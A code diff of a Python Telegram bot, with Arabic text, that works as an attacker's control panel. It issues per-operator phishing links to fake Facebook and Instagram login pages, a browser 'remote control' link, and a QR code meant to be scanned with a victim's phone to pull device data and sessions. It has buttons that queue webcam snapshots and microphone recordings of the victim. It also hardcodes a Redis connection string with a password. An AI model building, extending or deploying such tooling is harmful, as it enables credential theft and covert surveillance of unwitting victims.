@@ -1,5 +1,6 @@
 import os
 import threading
+import time
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask
@@ -36,6 +37,9 @@ except Exception as e:
     generate_qr_code_bytes = lambda *args: None
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+if not BOT_TOKEN:
+    raise ValueError("[-] BOT_TOKEN is missing! Please set it in Railway variables.")
+
 RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
@@ -45,17 +49,16 @@ if REDIS_URL.startswith("redis-cli"):
 if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
     REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
 
+redis_client = None
 try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
+    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
     redis_client.ping()
+    print("[+] Redis connection established successfully in main.py.")
 except Exception as e:
-    print(f"[-] Critical Redis Connection Error: {e}")
-    redis_client = None
+    print(f"[-] Critical Redis Connection Error in main.py: {e}")
 
-if not BOT_TOKEN:
-    raise ValueError("[-] BOT_TOKEN is missing!")
-
-bot = telebot.TeleBot(BOT_TOKEN)
+# تهيئة البوت وتطبيق الفلاسك
+bot = telebot.TeleBot(BOT_TOKEN, threaded=True)
 app = Flask(__name__)
 
 @app.route('/')
@@ -84,81 +87,93 @@ def main_menu():
 
 @bot.message_handler(commands=['start', 'panel'])
 def start_command(message):
-    user_name = message.from_user.first_name
-    text = (
-        f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
-        "غير مسؤول تماماً عن إساءة الاستخدام."
-    )
-    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
+    try:
+        user_name = message.from_user.first_name or "صديقي"
+        text = (
+            f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
+            "غير مسؤول تماماً عن إساءة الاستخدام."
+        )
+        bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
+    except Exception as err:
+        print(f"[-] Error in start_command: {err}")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     chat_id = call.message.chat.id
 
-    if call.data == "gen_fb":
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
-        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
-        bot.send_message(chat_id, f"🎯 **رابط فيسبوك المخصص:**\n`{link}`", parse_mode="Markdown")
-        
-    elif call.data == "gen_ig":
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
-        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
-        bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")
+    try:
+        if call.data == "gen_fb":
+            bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
+            link = f"{RAILWAY_URL}/login.php?id={chat_id}"
+            bot.send_message(chat_id, f"🎯 **رابط فيسبوك المخصص:**\n`{link}`", parse_mode="Markdown")
+            
+        elif call.data == "gen_ig":
+            bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
+            link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
+            bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")
 
-    elif call.data == "gen_rat":
-        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي المطور...")
-        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
-        bot.send_message(
-            chat_id, 
-            f"📱 **رابط المراقبة والتحكم الخلفي المطور جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.", 
-            parse_mode="Markdown"
-        )
-
-    elif call.data == "gen_qr":
-        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
-        token = str(uuid.uuid4())[:8]
-        if redis_client:
-            try:
-                redis_client.setex(f"qr_token:{token}", 300, chat_id)
-            except Exception as e:
-                print(f"Redis write error: {e}")
-        
-        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
-        qr_image = generate_qr_code_bytes(target_link)
-        if qr_image:
-            qr_image.name = 'pairing_qr.jpg'
-            bot.send_photo(
+        elif call.data == "gen_rat":
+            bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي المطور...")
+            link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
+            bot.send_message(
                 chat_id, 
-                qr_image, 
-                caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\nبمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
+                f"📱 **رابط المراقبة والتحكم الخلفي المطور جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.", 
                 parse_mode="Markdown"
             )
-        else:
-            bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
-        
-    elif call.data.startswith("rat_cam_"):
-        target_chat_id = call.data.replace("rat_cam_", "")
-        queue_command(target_chat_id, "snapshot")
-        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
 
-    elif call.data.startswith("rat_mic_"):
-        target_chat_id = call.data.replace("rat_mic_", "")
-        queue_command(target_chat_id, "audio")
-        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
+        elif call.data == "gen_qr":
+            bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
+            token = str(uuid.uuid4())[:8]
+            if redis_client:
+                try:
+                    redis_client.setex(f"qr_token:{token}", 300, chat_id)
+                except Exception as e:
+                    print(f"Redis write error: {e}")
+            
+            target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
+            qr_image = generate_qr_code_bytes(target_link)
+            if qr_image and qr_image.getbuffer().nbytes > 0:
+                qr_image.name = 'pairing_qr.jpg'
+                bot.send_photo(
+                    chat_id, 
+                    qr_image, 
+                    caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\nبمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
+                    parse_mode="Markdown"
+                )
+            else:
+                bot.send_message(chat_id, f"🎯 **رابط الـ QR المباشر:**\n`{target_link}`", parse_mode="Markdown")
+            
+        elif call.data.startswith("rat_cam_"):
+            target_chat_id = call.data.replace("rat_cam_", "")
+            queue_command(target_chat_id, "snapshot")
+            bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
+
+        elif call.data.startswith("rat_mic_"):
+            target_chat_id = call.data.replace("rat_mic_", "")
+            queue_command(target_chat_id, "audio")
+            bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
+            
+    except Exception as cb_err:
+        print(f"[-] Error in callback_handler: {cb_err}")
 
 def run_telegram_bot():
-    print("[+] Starting Telegram Bot polling in background thread...")
-    try:
-        bot.infinity_polling(skip_pending=True)
-    except Exception as e:
-        print(f"[-] Telegram Polling Error: {e}")
+    print("[+] Starting Telegram Bot polling loop...")
+    while True:
+        try:
+            # إزالة أي ويب هوك قديم قد يتسبب في تعطيل الـ Polling
+            bot.remove_webhook()
+            time.sleep(1)
+            bot.infinity_polling(skip_pending=True, interval=0.5, timeout=20)
+        except Exception as e:
+            print(f"[-] Telegram Polling Error encountered: {e}")
+            time.sleep(5)  # الانتظار قليلاً قبل إعادة المحاولة لمنع حظر الـ IP من تليجرام
 
 if __name__ == "__main__":
-    # تشغيل بوت التليجرام في خلفية مستقلة لمنع تجميد الكونتينر
+    # تشغيل بوت التليجرام في خلفية مستقلة مع إعادة المحاولة التلقائية
     bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
     bot_thread.start()
 
-    # تشغيل سيرفر Flask
+    # تشغيل سيرفر Flask الرئيسي
     port = int(os.environ.get("PORT", 8080))
     print(f"[+] Flask Web Server starting on port {port}...")
     app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
